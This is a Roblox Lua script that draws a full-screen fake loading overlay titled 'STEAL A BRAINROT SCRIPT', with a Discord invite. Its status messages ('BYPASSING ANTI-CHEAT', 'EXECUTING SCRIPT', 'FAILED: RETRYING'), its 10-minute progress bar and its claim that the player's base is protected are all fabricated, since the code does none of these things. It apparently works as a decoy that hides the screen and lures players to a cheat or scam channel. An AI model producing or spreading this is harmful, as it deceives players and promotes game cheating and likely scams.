-- skid 
local Players = game:GetService("Players")
local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LoadingScreen"
ScreenGui.DisplayOrder = 999
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.Size = UDim2.new(1, 0, 1, 0)
MainFrame.Position = UDim2.new(0, 0, 0, 0)
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "TitleLabel"
TitleLabel.Text = "STEAL A BRAINROT SCRIPT"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextSize = 36
TitleLabel.Size = UDim2.new(1, 0, 0, 50)
TitleLabel.Position = UDim2.new(0, 0, 0.12, 0)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.BackgroundTransparency = 1
TitleLabel.TextStrokeTransparency = 0.5
TitleLabel.TextStrokeColor3 = Color3.fromRGB(51, 51, 51)
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Name = "StatusLabel"
StatusLabel.Text = "LOADING SCRIPT"
StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
StatusLabel.TextSize = 24
StatusLabel.Size = UDim2.new(1, 0, 0, 30)
StatusLabel.Position = UDim2.new(0, 0, 0.42, 0)
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.BackgroundTransparency = 1
StatusLabel.TextStrokeTransparency = 0.7
StatusLabel.TextStrokeColor3 = Color3.fromRGB(51, 51, 51)
local DotsLabel = Instance.new("TextLabel")
DotsLabel.Name = "DotsLabel"
DotsLabel.Text = "."
DotsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
DotsLabel.TextSize = 24
DotsLabel.Size = UDim2.new(1, 0, 0, 30)
DotsLabel.Position = UDim2.new(0, 0, 0.46, 0)
DotsLabel.Font = Enum.Font.Gotham
DotsLabel.BackgroundTransparency = 1
DotsLabel.TextStrokeTransparency = 0.7
DotsLabel.TextStrokeColor3 = Color3.fromRGB(51, 51, 51)
local ProgressBarFrame = Instance.new("Frame")
ProgressBarFrame.Name = "ProgressBarFrame"
ProgressBarFrame.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
ProgressBarFrame.BorderSizePixel = 0
ProgressBarFrame.Size = UDim2.new(0.6, 0, 0.02, 0)
ProgressBarFrame.Position = UDim2.new(0.2, 0, 0.55, 0)
local ProgressBar = Instance.new("Frame")
ProgressBar.Name = "ProgressBar"
ProgressBar.BackgroundColor3 = Color3.fromRGB(51, 153, 255)
ProgressBar.BorderSizePixel = 0
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
local ProgressText = Instance.new("TextLabel")
ProgressText.Name = "ProgressText"
ProgressText.Text = "0%"
ProgressText.TextColor3 = Color3.fromRGB(255, 255, 255)
ProgressText.TextSize = 18
ProgressText.Size = UDim2.new(1, 0, 2, 0)
ProgressText.Position = UDim2.new(0, 0, 1, 0)
ProgressText.Font = Enum.Font.Gotham
ProgressText.BackgroundTransparency = 1
local DiscordText = Instance.new("TextLabel")
DiscordText.Name = "DiscordText"
DiscordText.Text = ".gg/6h9tWdTV3k for more!\nDon't Worry Your Base Is Protected!"
DiscordText.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscordText.TextSize = 36
DiscordText.Size = UDim2.new(1, 0, 0, 50)
DiscordText.Position = UDim2.new(0, 0, 0.7, 0)
DiscordText.Font = Enum.Font.GothamBold
DiscordText.BackgroundTransparency = 1
DiscordText.TextStrokeTransparency = 0.5
DiscordText.TextStrokeColor3 = Color3.fromRGB(51, 51, 51)
ProgressBar.Parent = ProgressBarFrame
ProgressText.Parent = ProgressBarFrame
ProgressBarFrame.Parent = MainFrame
TitleLabel.Parent = MainFrame
StatusLabel.Parent = MainFrame
DotsLabel.Parent = MainFrame
DiscordText.Parent = MainFrame
MainFrame.Parent = ScreenGui
ScreenGui.Parent = PlayerGui
local StatusMessages = {
    "LOADING SCRIPT",
    "LOADING MODULES",
    "BYPASSING ANTI-CHEAT",
    "ASSIGNING MODULES",
    "UNLOCKING VARIABLES",
    "EXECUTING SCRIPT",
    "FAILED: RETRYING"
}
local CurrentStatusIndex = 1
local CurrentDotsIndex = 1
local ProgressStartTime = os.clock()
local TotalProgressTime = 600
local function UpdateStatus()
    CurrentStatusIndex = CurrentStatusIndex % #StatusMessages + 1
    StatusLabel.Text = StatusMessages[CurrentStatusIndex]
end
local function UpdateDots()
    CurrentDotsIndex = CurrentDotsIndex % 3 + 1
    DotsLabel.Text = string.rep(".", CurrentDotsIndex)
end
local function UpdateProgress()
    local elapsed = os.clock() - ProgressStartTime
    local progress = math.min(elapsed / TotalProgressTime, 1)
    ProgressBar.Size = UDim2.new(progress, 0, 1, 0)
    ProgressText.Text = math.floor(progress * 100) .. "%"
    return progress >= 1
end
coroutine.wrap(function()
    while true do
        UpdateStatus()
        task.wait(30)
    end
end)()
coroutine.wrap(function()
    while true do
        UpdateDots()
        task.wait(0.5)
    end
end)()
coroutine.wrap(function()
    while true do
        if UpdateProgress() then
            break
        end
        task.wait(0.1)
    end
end)()
